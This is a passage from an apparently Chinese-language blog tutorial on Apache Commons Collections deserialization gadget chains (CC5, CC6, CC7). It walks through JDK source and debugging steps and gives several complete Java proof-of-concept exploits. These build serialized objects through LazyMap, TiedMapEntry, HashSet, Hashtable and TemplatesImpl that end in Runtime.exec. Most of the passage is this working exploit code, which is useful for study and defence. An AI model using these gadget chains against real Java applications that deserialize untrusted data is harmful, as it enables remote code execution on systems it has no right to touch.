class="java">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);//令val=null,再通过反射修改Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);val.setAccessible(true);val.set(badAttributeValueExpException,tiedmapentry);serialize(badAttributeValueExpException);unserialize(&quot;ser.bin&quot;);</code></pre><h3 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h3><p>完整的利用链如下：</p><pre><code class="mermaid">graph TBA(&quot;javax.management.BadAttributeValueExpException#\nreadObject()&quot;)--&gt;B(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;G(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>完整POC：</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;public class App &#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.toString();        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(badAttributeValueExpException,tiedmapentry);        serialize(badAttributeValueExpException);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h3><p>上面poc1中已经到了<code>ChainedTransformer</code>,那就是可以不用<code>InvokerTransformer</code>这条链，可以修改一下走<code>InstantiateTransformer</code>–&gt;<code>TrAXFilter</code>–&gt;<code>TemplatesImpl</code>这条链</p><p>利用链：</p><pre><code class="mermaid">graph TBA(&quot;javax.management.BadAttributeValueExpException#\nreadObject()&quot;)--&gt;B(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ntoString()&quot;)--&gt;C(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.InstantiateTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;G(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter#\nTrAXFilter()&quot;)--&gt;H(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nnewTransformer()&quot;)--&gt;I(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ngetTransletInstance()&quot;)--&gt;J(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\ndefineTransletClasses()&quot;)--&gt;K(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#\nTransletClassLoader.defineClass()&quot;)--&gt;L(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>最终POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        //通过反射使得_bytecodes=bytes        TemplatesImpl tmpl = new TemplatesImpl();        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);        Field _name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);        _name.setAccessible(true);        _name.set(tmpl,&quot;aaa&quot;);        Field _class = TemplatesImpl.class.getDeclaredField(&quot;_class&quot;);        _class.setAccessible(true);        _class.set(tmpl,null);//        tmpl.newTransformer();//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;);//        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)        &#125;;        ChainedTransformer transformerChain = new ChainedTransformer(transformers);//        transformerChain.transform(&#39;a&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,transformerChain);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.toString();        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);        Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(badAttributeValueExpException,tiedmapentry);        serialize(badAttributeValueExpException);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk无限制</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前半部分是和前面的链子是相同的，不再分析</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);        tiedmapentry.hashCode();</code></pre><p>和CC1的&gt;8u71那条链子一样，使用了hashCode()来调用getValue()方法</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>还是和CC1的&gt;8u71那条链子一样，通过HashMap的hash方法来调用这个hashCode()，再使用put方法方法调用hash()</p><pre><code class="java">static final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;public V put(K key, V value) &#123;        return putVal(hash(key), key, value, false, true);    &#125;</code></pre><p>不同的是这条链子使用的是<code>HashSet</code>的readObject来进行收尾，这个方法里调用了put方法，而且在属性定义可以知道这个map就是HashMap</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        // Read in any hidden serialization magic    ........        // Create backing HashMap        map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :               new HashMap&lt;E,Object&gt;(capacity, loadFactor));        // Read in all elements in the proper order.        for (int i=0; i&lt;size; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                E e = (E) s.readObject();            map.put(e, PRESENT);        &#125;    &#125;</code></pre><p>按照目前的想法,构造的poc如下</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);        HashSet hashset = new HashSet(1);        hashset.add(tiedmapentry);                serialize(hashset);        unserialize(&quot;ser.bin&quot;);</code></pre><p>但是这个写法会出现一个问题，程序运行时，在<code>hashset.add(tiedmapentry);</code>这里就触发执行了命令，因为这个add()里面调用了put方法</p><pre><code class="java">public boolean add(E e) &#123;        return map.put(e, PRESENT)==null;    &#125;</code></pre><p>因为这里就触发了命令执行，执行命令后往后继续运行报错，没有走到序列化和反序列化的代码，所以要稍微修改一下</p><p>首先，在开头构造<code>transformers</code>链的时候先给一个无意义的链，让程序先执行</p><pre><code class="java">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;//无意义的链ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);//        chainedTransformer.transform(&#39;s&#39;);Map map = new HashMap&lt;&gt;();Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);HashSet hashset = new HashSet(1);hashset.add(tiedmapentry);</code></pre><p>这样就不会执行命令了，</p><p>注意：要删除掉lazymap中的已经存在的key,否则不会进入get的if判断，导致利用链断裂</p><pre><code class="java">lazymap.remove(&quot;abc&quot;);</code></pre><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>然后再通过反射修改回真正的链</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);f.setAccessible(true);f.set(chainedTransformer, transformers);</code></pre><p>利用链如下：</p><pre><code class="mermaid">graph TBA(&quot;java.util.HashSet#\nreadObject()&quot;)--&gt;B(&quot;java.util.HashMap#\nput()&quot;)--&gt;C(&quot;java.util.HashMap#\nhash()&quot;)--&gt;D(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode()&quot;)--&gt;E(&quot;org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue()&quot;)--&gt;F(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;G(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;H(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;I(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>最后的POC:</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.HashSet;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import javax.management.BadAttributeValueExpException;public class App&#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;&#125;;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();//        HashMap hashMap = new HashMap();//        hashMap.put(tiedmapentry, &quot;test&quot;);        HashSet hashset = new HashSet(1);        hashset.add(tiedmapentry);        lazymap.remove(&quot;abc&quot;);        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        f.setAccessible(true);        f.set(chainedTransformer, transformers);        serialize(hashset);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><p>还可以像CC5一样走<code>InstantiateTransformer</code>和<code>TrAXFilter</code>这条链，这里就不写了</p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>条件：</p><p>commons-collections:3.1-3.2.1</p><p>jdk无限制</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;commons-collections&lt;/groupId&gt;      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;      &lt;version&gt;3.1&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>前面部分和CC1的是一样的:</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>然后寻找调用get()的地方，前面的利用链中用的是AnnotationInvocationHandler类的invoke()或者TiedMapEntry类的getValue()，而这次用的是AbstractMap的equals方法,这个方法是用来比较两个对象是否相等的</p><pre><code class="java">public boolean equals(Object o) &#123;        if (o == this)            return true;        if (!(o instanceof Map))            return false;        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;        if (m.size() != size())            return false;        try &#123;            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();            while (i.hasNext()) &#123;                Entry&lt;K,V&gt; e = i.next();                K key = e.getKey();                V value = e.getValue();                if (value == null) &#123;                    if (!(m.get(key)==null &amp;&amp; m.containsKey(key)))                        return false;                &#125; else &#123;                    if (!value.equals(m.get(key)))                        return false;                &#125;            &#125;        &#125; catch (ClassCastException unused) &#123;            return false;        &#125; catch (NullPointerException unused) &#123;            return false;        &#125;        return true;    &#125;</code></pre><p>这个方法调用了<code>m.get(key)</code>,其中m是来自<code>Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</code> ,而 o 是传入的参数，可控，但是需要过三个if判断</p><p>然后寻找哪个地方调用了<code>equals</code></p><p>这里使用的是HashTable的reconstitutionPut方法</p><pre><code class="java">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)        throws StreamCorruptedException    &#123;        if (value == null) &#123;            throw new java.io.StreamCorruptedException();        &#125;        // Makes sure the key is not already in the hashtable.        // This should not happen in deserialized version.        int hash = key.hashCode();        int index = (hash &amp; 0x7FFFFFFF) % tab.length;        for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;                throw new java.io.StreamCorruptedException();            &#125;        &#125;        // Creates the new entry.        @SuppressWarnings(&quot;unchecked&quot;)            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];        tab[index] = new Entry&lt;&gt;(hash, key, value, e);        count++;    &#125;</code></pre><p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。这个方法是私有方法不能直接调用</p><p>然后查看在哪里调用了<code>reconstitutionPut</code>，只有在这个类的readObject方法调用了</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)         throws IOException, ClassNotFoundException    &#123;      .........        length = Math.min(length, origlength);        table = new Entry&lt;?,?&gt;[length];        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);        count = 0;        // Read the number of elements and then all the key/value objects        for (; elements &gt; 0; elements--) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K)s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V)s.readObject();            // sync is eliminated for performance            reconstitutionPut(table, key, value);        &#125;    &#125;</code></pre><p>这里的key与value就是我们自己存进去的，for循环是遍历hashtable对象中的元素</p><p>乍一看链子也就这样了，其实还有很多坑</p><p>目前的构造:</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);Map map = new HashMap&lt;&gt;();Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);Hashtable hashTable = new Hashtable();hashTable.put(lazymap, 1);serialize(hashTable);unserialize(&quot;ser.bin&quot;);</code></pre><p>经过调试发现，在reconstitutionPut()中，无法进入for循环</p><pre><code class="java">int hash = key.hashCode();int index = (hash &amp; 0x7FFFFFFF) % tab.length;for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;        throw new java.io.StreamCorruptedException();    &#125;&#125;// Creates the new entry.        @SuppressWarnings(&quot;unchecked&quot;)            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];        tab[index] = new Entry&lt;&gt;(hash, key, value, e);        count++;</code></pre><p>此时hash&#x3D;0 这个key就是lazymap, 这个for循环是遍历这个tab, tab的所有值显示为null，说明没有值，所以没有进入for循环，直接运行到后面，将内容保存到tab里面<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p><p>这就说明，无论第一个键值对是什么都不会进如循环里面，所以要添加第二个键值对</p><pre><code class="java">Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;a&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;b&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>这里一定要使用不同的hashmap，不然再hashtable.put的时候会认为是同一个</p><p>然后继续调试，又回到了for循环</p><pre><code class="java">for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;        throw new java.io.StreamCorruptedException();    &#125;&#125;</code></pre><p>这里要满足<code>e.hash == hash</code>就是第一个key的hash和第二个key的hash相等，如果不相等则直接为false，不执行后面的equals了</p><p>这里不能直接将两个key设置为相等的，因为在lazymap的get方法中有以下逻辑，map的key不能重复否则就不会执行transform函数执行代码了</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>所以只能构造为”yy” “zZ”这两个key</p><pre><code class="java">Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;yy&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;zZ&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>运行后发现，还没有就行反序列化，命令执行就触发了，原来是在<code>hashtable.put(lazyMap2, 1);</code>的时候刚好触发了put方法里面的<code>equals</code>方法，然后就没有往下执行了</p><pre><code class="java">public synchronized V put(K key, V value) &#123;        // Make sure the value is not null        if (value == null) &#123;            throw new NullPointerException();        &#125;        // Makes sure the key is not already in the hashtable.        Entry&lt;?,?&gt; tab[] = table;        int hash = key.hashCode();        int index = (hash &amp; 0x7FFFFFFF) % tab.length;        @SuppressWarnings(&quot;unchecked&quot;)        Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];        for(; entry != null ; entry = entry.next) &#123;            if ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;                V old = entry.value;                entry.value = value;                return old;            &#125;        &#125;        addEntry(hash, key, value, index);        return null;    &#125;</code></pre><p>解决这个问题和CC6一样，先构造<code>transformers</code>链的时候先给一个无意义的链，让程序先执行，然后再通过反射修改回来</p><pre><code class="java">Transformer transformerChain = new ChainedTransformer(fakeTransformers);        Map innerMap1 = new HashMap();        Map innerMap2 = new HashMap();        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);        lazyMap1.put(&quot;yy&quot;, 1);        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);        lazyMap2.put(&quot;zZ&quot;, 1);        Hashtable hashtable = new Hashtable();        hashtable.put(lazyMap1, 1);        hashtable.put(lazyMap2, 1);        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(transformerChain,transformers);        serialize(hashtable);        unserialize(&quot;ser.bin&quot;);</code></pre><p>然后执行不成功，调试发现是因为<code>m.size() != size()</code>为true,</p><pre><code class="java">public boolean equals(Object o) &#123;    if (o == this)        return true;    if (!(o instanceof Map))        return false;    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;    if (m.size() != size())        return false;</code></pre><p>原因是反序列化前，运行到LazyMap的get()方法中，执行完<code>transform</code>往下，<code>map.put(key, value)</code>这里给map添加了键值对使得size变大了</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>经过调试发现key是”yy”,所以要删除掉</p><pre><code class="java">Transformer transformerChain = new ChainedTransformer(fakeTransformers);Map hashMap1 = new HashMap();Map hashMap2 = new HashMap();Map lazyMap1 = LazyMap.decorate(hashMap1, transformerChain);lazyMap1.put(&quot;yy&quot;, 1);Map lazyMap2 = LazyMap.decorate(hashMap2, transformerChain);lazyMap2.put(&quot;zZ&quot;, 1);Hashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 1);Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);field.setAccessible(true);field.set(transformerChain,transformers);lazyMap2.remove(&quot;yy&quot;);serialize(hashtable);unserialize(&quot;ser.bin&quot;);</code></pre><p>利用链如下</p><pre><code class="mermaid">graph TBA(&quot;java.util.Hashtable#\nreadObject()&quot;)--&gt;B(&quot;java.util.Hashtable#\nreconstitutionPut()&quot;)--&gt;C(&quot;java.util.AbstractMap#\nequals()&quot;)--&gt;D(&quot;org.apache.commons.collections.map.LazyMap#\nget()&quot;)--&gt;E(&quot;org.apache.commons.collections.functors.ChainedTransformer#\ntransform()&quot;)--&gt;F(&quot;org.apache.commons.collections.functors.InvokerTransformer#\ntransform()\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform()&quot;)--&gt;G(&quot;Runtime.getRuntime.exec&quot;)</code></pre><p>完整代码：</p><pre><code class="java">package org.example;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.Hashtable;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class App&#123;    public static void main(String[] args) throws ClassNotFoundException, IOException, IllegalAccessException, NoSuchFieldException &#123;        Transformer[] fakeTransformers = new Transformer[] &#123;&#125;;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new 